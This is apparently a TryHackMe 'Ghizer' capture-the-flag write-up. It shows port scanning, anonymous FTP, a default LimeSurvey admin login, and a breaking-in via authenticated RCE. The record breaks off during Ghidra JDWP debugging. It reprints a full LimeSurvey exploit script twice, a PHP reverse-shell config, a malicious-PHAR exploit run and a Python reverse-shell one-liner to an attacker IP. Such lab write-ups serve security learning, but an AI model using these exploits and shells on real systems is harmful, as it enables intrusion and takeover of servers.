# Ghizer — Writeup

## Overview
### Ghizer — Writeup
### Ghizer — Writeup
----
lucrecia has installed multiple web applications on the server.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/903b4a5cc6a2d5a37b8a6564aeb9315b.png)
Start Machine
Are you able to complete the challenge?
The machine may take up to 5 minutes to boot and configure
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/.ssh]
└─$ rustscan -a 10.10.236.29 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.236.29:21
Open 10.10.236.29:80
Open 10.10.236.29:443
Open 10.10.236.29:33297
Open 10.10.236.29:46361
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.236.29 [5 ports]
Discovered open port 443/tcp on 10.10.236.29
Discovered open port 21/tcp on 10.10.236.29
Discovered open port 80/tcp on 10.10.236.29
Discovered open port 46361/tcp on 10.10.236.29
Discovered open port 33297/tcp on 10.10.236.29
Completed Connect Scan (5 total ports)
Initiating Service scan
Scanning 5 services on 10.10.236.29
Completed Service scan (5 services on 1 host)
NSE: Script scanning 10.10.236.29.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.236.29
Host is up, received user-set (0.18s latency).

PORT      STATE SERVICE    REASON  VERSION
21/tcp    open  ftp?       syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
|     Please login with USER and PASS.
|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp    open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         LimeSurvey    
|_http-generator: LimeSurvey http://www.limesurvey.org
|_http-favicon: Unknown favicon MD5: B55AD3F0C0A029568074402CE92ACA23
443/tcp   open  ssl/http   syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   afb1a2b911832e49f7079d1a71989ca3
| SHA-1: 37f1945f6bc43fad3f0fca8d37882c17cc250792
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAIIhLFTsAdpUMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDA3MjMxNzI3MzFaFw0zMDA3MjExNzI3MzFaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALm4
| +BEIDO1MIeQZQkUZfeEqegkSYi8IGF2zvpL2zpUOCjcpm9pFZwj/ZT8g/nbdhVpX
| Q0z3eWzFKRRZdthTOfCtNkZjQhJlpR+Fvc7QDUHSG+ugZL0nIuQMKaniom6OVuQg
| 3nyxPehC9eYOjovV6m3TOWVHRYMRpf54RHHwwvpHwHkJAEcg7oHwBgP/JeW3h20r
| G/Ri8FpPZs49xYArZ15te9ofw0TUigqx03RguwKLYr+/i7+UFwmzU93+ylz/PE16
| HVfEBAFGIY52wWkc5Pt3+B+T5HZqVLqAW8LNcxSuugiMkgV1r4QQlBgNpc026aZR
| EG6sF9C57EOQgyBVihECAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAXYtbViAQzTFPjlPzwItXfMsyYYkH9guFsI9l0A6/6xa6CCwklJAF1vjz
| tpHg338NRn4CXobk9Y6aopmUsNhFwlryS5YwPQ1s5ml6GHaDQ7ijG52J4Uj1J4o5
| nRlDgqXi8EM/Dl5cgwHBnQ3k/u3uoPp/H0jIfXK/jskVurNb/sT6Raj5TEgcgMMm
| 8Hzj0jqSROhDZFtU93z8OCZWBaO8u+wVj0xtdHpg+X8UQalIrASlsSNn1i50lU2p
| 0C+eASFiDrOue7gzDDO4pdYrxmG5MiRNrfKQPLv3IvT0gEgCgkulRLo//CeY1tQ9
| 7KFSteW6LSwpqHdP08faw+/nJnfnXQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-generator: WordPress 5.4.2
|_http-title: Ghizer &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.18 (Ubuntu)
33297/tcp open  java-rmi   syn-ack Java RMI
46361/tcp open  tcpwrapped syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=7/25%Time=64C010DC%P=x86_64-pc-linux-gnu%r(NULL
SF:,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
SF:3\.0\.3\)\n")%r(GenericLines,58,"220\x20Welcome\x20to\x20Anonymous\x20F
SF:TP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x
SF:20USER\x20and\x20PASS\.\n")%r(Help,58,"220\x20Welcome\x20to\x20Anonymou
SF:s\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20
SF:with\x20USER\x20and\x20PASS\.\n")%r(GetRequest,58,"220\x20Welcome\x20to
SF:\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\
SF:x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(HTTPOptions,58,"220\x20
SF:Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n5
SF:30\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(RTSPReques
SF:t,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x2
SF:03\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")
SF:%r(RPCCheck,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\
SF:(vsFTPd\x203\.0\.3\)\n")%r(DNSVersionBindReqTCP,58,"220\x20Welcome\x20t
SF:o\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please
SF:\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(DNSStatusRequestTCP,58
SF:,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.
SF:0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(S
SF:SLSessionReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20
SF:\(vsFTPd\x203\.0\.3\)\n")%r(TerminalServerCookie,33,"220\x20Welcome\x20
SF:to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(TLSSess
SF:ionReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFT
SF:Pd\x203\.0\.3\)\n")%r(Kerberos,33,"220\x20Welcome\x20to\x20Anonymous\x2
SF:0FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(SMBProgNeg,33,"220\x20Wel
SF:come\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r
SF:(X11Probe,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(v
SF:sFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PA
SF:SS\.\n")%r(FourOhFourRequest,58,"220\x20Welcome\x20to\x20Anonymous\x20F
SF:TP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x
SF:20USER\x20and\x20PASS\.\n");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.20 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.236.29
Connected to 10.10.236.29.
220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
Name (10.10.236.29:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /home/lucrecia/ftp/

honeypot

https://ns2.elhacker.net/e-zines/underdocs/UnderDOCS%20-%20Mayo%202020,%20N%C3%BAmero%2010.pdf page 9

http://10.10.236.29/

LimeSurvey

https://10.10.236.29/

Welcome to my WordPress antihackers!

I use the plugin WPS Hide Login for hide wp-login!

try harder!

? it’s very important :3333

<li><a href="/?devtools">Log in</a></li>

https://www.exploit-db.com/exploits/50573

admin:password

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit limesurvey RCE
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenti | php/webapps/50573.py
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                           
┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit -m 50573.py   
  Exploit: LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50573
     Path: /usr/share/exploitdb/exploits/php/webapps/50573.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/witty/Downloads/50573.py

                                                                                           
┌──(witty㉿kali)-[~/Downloads]
└─$ cat 50573.py
```
```text
# Exploit Title: LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenticated)
```
```text
# Google Dork: inurl:limesurvey/index.php/admin/authentication/sa/login
```
```text
# Date: 05/12/2021
```
```text
# Exploit Author: Y1LD1R1M
```
```text
# Vendor Homepage: https://www.limesurvey.org/
```
```text
# Software Link: https://download.limesurvey.org/latest-stable-release/limesurvey5.2.4+211129.zip
```
```text
# Version: 5.2.x
```
```text
# Tested on: Kali Linux 2021.3
```
```text
# Reference: https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

#!/usr/bin/python
```
```text
# -*- coding: utf-8 -*-

import requests
import sys
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
print("_______________LimeSurvey RCE_______________")
print("")
print("")
print("Usage: python exploit.py URL username password port")
print("Example: python exploit.py http://192.26.26.128 admin password 80")
print("")
print("")
print("== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==")
print("== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==")
print("==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==")
print("==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==")
print("==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==")
print("==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==")
print("")
print("")
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
port = sys.argv[4]

req = requests.session()
print("[+] Retrieving CSRF token...")
loginPage = req.get(url+"/index.php/admin/authentication/sa/login")
response = loginPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token = s.findAll('input')[0].get("value")
print(CSRF_token)
print("[+] Sending Login Request...")

login_creds = {
          "user": username,
          "password": password,
          "authMethod": "Authdb",
          "loginlang":"default",
          "action":"login",
          "width":"1581",
          "login_submit": "login",
          "YII_CSRF_TOKEN": CSRF_token
}
print("[+]Login Successful")
print("")
print("[+] Upload Plugin Request...")
print("[+] Retrieving CSRF token...")
filehandle = open("/root/limesurvey/plugin/Y1LD1R1M.zip",mode = "rb") # CHANGE THIS
login = req.post(url+"/index.php/admin/authentication/sa/login" ,data=login_creds)
UploadPage = req.get(url+"/index.php/admin/pluginmanager/sa/index")
response = UploadPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token2 = s.findAll('input')[0].get("value")
print(CSRF_token2)
Upload_creds = {
          "YII_CSRF_TOKEN":CSRF_token2,
          "lid":"$lid",
          "action": "templateupload"
}
file_upload= req.post(url+"/index.php/admin/pluginmanager?sa=upload",files = {'the_file':filehandle},data=Upload_creds)
UploadPage = req.get(url+"/index.php/admin/pluginmanager?sa=uploadConfirm")
response = UploadPage.text
print("[+] Plugin Uploaded Successfully")
print("")
print("[+] Install Plugin Request...")
print("[+] Retrieving CSRF token...")

InstallPage = req.get(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin")
response = InstallPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token3 = s.findAll('input')[0].get("value")
print(CSRF_token3)
Install_creds = {
          "YII_CSRF_TOKEN":CSRF_token3,
          "isUpdate": "false"
}
file_install= req.post(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin",data=Install_creds)
print("[+] Plugin Installed Successfully")
print("")
print("[+] Activate Plugin Request...")
print("[+] Retrieving CSRF token...")
ActivatePage = req.get(url+"/index.php/admin/pluginmanager?sa=activate")
response = ActivatePage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token4 = s.findAll('input')[0].get("value")
print(CSRF_token4)
Activate_creds = {
          "YII_CSRF_TOKEN":CSRF_token4,
          "pluginId": "1" # CHANGE THIS
}
file_activate= req.post(url+"/index.php/admin/pluginmanager?sa=activate",data=Activate_creds)
print("[+] Plugin Activated Successfully")
print("")
print("[+] Reverse Shell Starting, Check Your Connection :)")
shell= req.get(url+"/upload/plugins/Y1LD1R1M/php-rev.php") # CHANGE THIS 

┌──(root㉿kali)-[/home/witty/Downloads]
└─# python3 50573.py http://10.10.236.29 admin password 80
_______________LimeSurvey RCE_______________

Usage: python exploit.py URL username password port
Example: python exploit.py http://192.26.26.128 admin password 80

== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==
== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==
==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==
==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==
==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==
==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==

[+] Retrieving CSRF token...
czJKTHRFVmM4VnQ5bkxGbnRiTnJTQXcwY2lSNDQyYnnvk9tk22bB0HvNUZ27Llva1M2VALatbVoQTFFVMMINzg==
[+] Sending Login Request...
[+]Login Successful

[+] Upload Plugin Request...
[+] Retrieving CSRF token...
Traceback (most recent call last):
  File "/home/witty/Downloads/50573.py", line 64, in <module>
    filehandle = open("/root/limesurvey/plugin/Y1LD1R1M.zip",mode = "rb") # CHANGE THIS
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/root/limesurvey/plugin/Y1LD1R1M.zip'

another way

https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

└─# git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
Cloning into 'Limesurvey-RCE'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 24 (delta 2), reused 0 (delta 0), pack-reused 18
Receiving objects: 100% (24/24), 10.00 KiB | 487.00 KiB/s, done.
Resolving deltas: 100% (5/5), done.
                                                                                           
┌──(root㉿kali)-[/home/witty/Downloads]
└─# cd Limesurvey-RCE 
                                                                                           
┌──(root㉿kali)-[/home/witty/Downloads/Limesurvey-RCE]
└─# ls
config.xml  exploit.py  php-rev.php  README.md  Y1LD1R1M.zip
                                                                                           
┌──(root㉿kali)-[/home/witty/Downloads/Limesurvey-RCE]
└─# nano php-rev.php 
                                                                                           
┌──(root㉿kali)-[/home/witty/Downloads/Limesurvey-RCE]
└─# head php-rev.php 
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.19.103';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';

┌──(root㉿kali)-[/home/witty/Downloads/Limesurvey-RCE]
└─# pwd                                                   
/home/witty/Downloads/Limesurvey-RCE

┌──(root㉿kali)-[/home/witty/Downloads/Limesurvey-RCE]
└─# subl exploit.py                               
                                                                                           
┌──(root㉿kali)-[/home/witty/Downloads/Limesurvey-RCE]
└─# cat exploit.py
```
```text
# Exploit Title: LimeSurvey RCE
```
```text
# Google Dork: inurl:limesurvey/index.php/admin/authentication/sa/login
```
```text
# Date: 05.12.2021
```
```text
# Exploit Author: Y1LD1R1M
```
```text
# Vendor Homepage: https://www.limesurvey.org/
```
```text
# Software Link: https://download.limesurvey.org/latest-stable-release/limesurvey5.2.4+211129.zip
```
```text
# Version: 5.2.x
```
```text
# Tested on: Kali Linux 2021.3
```
```text
# Reference: https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

#!/usr/bin/python
```

## Exploitation
```text
# -*- coding: utf-8 -*-

import requests
import sys
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
print("_______________LimeSurvey RCE_______________")
print("")
print("")
print("Usage: python exploit.py URL username password port")
print("Example: python exploit.py http://192.26.26.128 admin password 80")
print("")
print("")
print("== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==")
print("== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==")
print("==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==")
print("==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==")
print("==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==")
print("==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==")
print("")
print("")
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
port = sys.argv[4]

req = requests.session()
print("[+] Retrieving CSRF token...")
loginPage = req.get(url+"/index.php/admin/authentication/sa/login")
response = loginPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token = s.findAll('input')[0].get("value")
print(CSRF_token)
print("[+] Sending Login Request...")

login_creds = {
          "user": username,
          "password": password,
          "authMethod": "Authdb",
          "loginlang":"default",
          "action":"login",
          "width":"1581",
          "login_submit": "login",
          "YII_CSRF_TOKEN": CSRF_token
}
print("[+]Login Successful")
print("")
print("[+] Upload Plugin Request...")
print("[+] Retrieving CSRF token...")
filehandle = open("/home/witty/Downloads/Limesurvey-RCE/Y1LD1R1M.zip",mode = "rb") # CHANGE THIS
login = req.post(url+"/index.php/admin/authentication/sa/login" ,data=login_creds)
UploadPage = req.get(url+"/index.php/admin/pluginmanager/sa/index")
response = UploadPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token2 = s.findAll('input')[0].get("value")
print(CSRF_token2)
Upload_creds = {
          "YII_CSRF_TOKEN":CSRF_token2,
          "lid":"$lid",
          "action": "templateupload"
}
file_upload= req.post(url+"/index.php/admin/pluginmanager?sa=upload",files = {'the_file':filehandle},data=Upload_creds)
UploadPage = req.get(url+"/index.php/admin/pluginmanager?sa=uploadConfirm")
response = UploadPage.text
print("[+] Plugin Uploaded Successfully")
print("")
print("[+] Install Plugin Request...")
print("[+] Retrieving CSRF token...")

InstallPage = req.get(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin")
response = InstallPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token3 = s.findAll('input')[0].get("value")
print(CSRF_token3)
Install_creds = {
          "YII_CSRF_TOKEN":CSRF_token3,
          "isUpdate": "false"
}
file_install= req.post(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin",data=Install_creds)
print("[+] Plugin Installed Successfully")
print("")
print("[+] Activate Plugin Request...")
print("[+] Retrieving CSRF token...")
ActivatePage = req.get(url+"/index.php/admin/pluginmanager?sa=activate")
response = ActivatePage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token4 = s.findAll('input')[0].get("value")
print(CSRF_token4)
Activate_creds = {
          "YII_CSRF_TOKEN":CSRF_token4,
          "pluginId": "1" # CHANGE THIS
}
file_activate= req.post(url+"/index.php/admin/pluginmanager?sa=activate",data=Activate_creds) 
print("[+] Plugin Activated Successfully")
print("")
print("[+] Reverse Shell Starting, Check Your Connection :)")
shell= req.get(url+"/home/witty/Downloads/Limesurvey-RCE/php-rev.php") # CHANGE THIS

┌──(root㉿kali)-[/home/witty/Downloads/Limesurvey-RCE]
└─# python3 exploit.py http://10.10.236.29 admin password 80
_______________LimeSurvey RCE_______________

Usage: python exploit.py URL username password port
Example: python exploit.py http://192.26.26.128 admin password 80

== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==
== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==
==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==
==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==
==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==
==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==

[+] Retrieving CSRF token...
NX5LSFRCb2VYa3c1cm14THU5SFQ5RFprM0tLTXdXMUxzmWuCc3cko4hSzHtu1L7mJOkQUMg4rJcFOikdEuqC7g==
[+] Sending Login Request...
[+]Login Successful

[+] Upload Plugin Request...
[+] Retrieving CSRF token...
UnZTUFRIUFJmNTlzd2Nxfm8zeUQ1WU9oQX5maEc4ckFBlq6zjiusDpivbMKWNXNyCRtb3V4qrFDlVeAj4EVRkg==
[+] Plugin Uploaded Successfully

[+] Install Plugin Request...
[+] Retrieving CSRF token...
UnZTUFRIUFJmNTlzd2Nxfm8zeUQ1WU9oQX5maEc4ckFBlq6zjiusDpivbMKWNXNyCRtb3V4qrFDlVeAj4EVRkg==
[+] Plugin Installed Successfully

[+] Activate Plugin Request...
[+] Retrieving CSRF token...
UnZTUFRIUFJmNTlzd2Nxfm8zeUQ1WU9oQX5maEc4ckFBlq6zjiusDpivbMKWNXNyCRtb3V4qrFDlVeAj4EVRkg==
[+] Plugin Activated Successfully

[+] Reverse Shell Starting, Check Your Connection :)

┌──(root㉿kali)-[/home/witty/.ssh]
└─# rlwrap nc -lvnp 1337 
listening on [any] 1337 ...

Version 3.15.9 

I was using an exploit for
```
```text
# Version: 5.2.x
I see

https://www.exploit-db.com/exploits/46634

┌──(root㉿kali)-[/home/witty/Downloads]
└─# python2 LimeSurvey.py http://10.10.236.29 admin password 
[*] Logging in to LimeSurvey...
[*] Creating a new Survey...
[+] SurveyID: 894635
[*] Uploading a malicious PHAR...
[*] Sending the Payload...
[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/894635/files/malicious.jpg
[+] Pwned! :)
[+] Getting the shell...
```
```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```text
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

┌──(root㉿kali)-[/home/witty/.ssh]
└─# rlwrap nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.236.29] 43288
www-data@ubuntu:/var/www/html/limesurvey$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null                         
www-data@ubuntu:/var/www/html/limesurvey$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

- "netstat": This is the command used to display network statistics.
- "-n": This option tells netstat to display numerical addresses instead of resolving them to hostnames. This can speed up the output as it avoids DNS lookups.
- "-t": This option filters the output to display only TCP connections.
- "-p": This option shows the process ID (PID) and name of the program associated with each connection or listening port.
- "-l": This option limits the output to display only listening ports.

www-data@ubuntu:/home/veronica$ netstat -ntpl
netstat -ntpl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:18001         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       0      0 :::46361                :::*                    LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::33297                :::*                    LISTEN      -               
tcp6       0      0 :::18002                :::*                    LISTEN      -            

https://www.exploit-db.com/exploits/47231
nope

https://www.youtube.com/watch?v=N3VcWIUpgfE
```
```text
# Ghidra (Debug Mode) Remote Code Execution Through JDWP Debug Port
```
```text
# Java Debug Wire Protocol
Following steps
connecting JDWP
jdb -attach localhost:18001
listing classes
classpath
classes

www-data@ubuntu:/home/veronica$ jdb -attach localhost:18001
jdb -attach localhost:18001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> classpath
classpath
base directory: /home/veronica
classpath: [/home/veronica/ghidra_9.0/support/../Ghidra/Framework/Utility/lib/Utility.jar]
> classes
classes
** classes list **
boolean[]
byte[]
byte[][]
char[]
char[][]
char[][][]
com.sun.beans.WeakCache
com.sun.beans.finder.InstanceFinder
com.sun.beans.finder.PropertyEditorFinder
com.sun.beans.util.Cache
com.sun.beans.util.Cache$CacheEntry[]
com.sun.beans.util.Cache$Kind
com.sun.beans.util.Cache$Kind$1
com.sun.beans.util.Cache$Kind$2
com.sun.beans.util.Cache$Kind$3
com.sun.beans.util.Cache$Kind[]
com.sun.crypto.provider.SunJCE
com.sun.crypto.provider.SunJCE$1
com.sun.java.help.impl.DocumentParser
com.sun.java.help.impl.LangElement
com.sun.java.help.impl.MyBufferedReader
com.sun.java.help.impl.Parser
com.sun.java.help.impl.Parser$ParserMulticaster
com.sun.java.help.impl.ParserEvent
com.sun.java.help.impl.ParserListener
com.sun.java.help.impl.ScanBuffer
com.sun.java.help.impl.Tag
com.sun.java.help.impl.TagProperties
com.sun.java.help.impl.XmlReader
com.sun.java.swing.SwingUtilities3
com.sun.jmx.defaults.JmxProperties
com.sun.jmx.interceptor.DefaultMBeanServerInterceptor
com.sun.jmx.interceptor.DefaultMBeanServerInterceptor$ResourceContext
com.sun.jmx.interceptor.DefaultMBeanServerInterceptor$ResourceContext$1
com.sun.jmx.interceptor.MBeanServerInterceptor
com.sun.jmx.mbeanserver.ClassLoaderRepositorySupport
com.sun.jmx.mbeanserver.ClassLoaderRepositorySupport$LoaderEntry
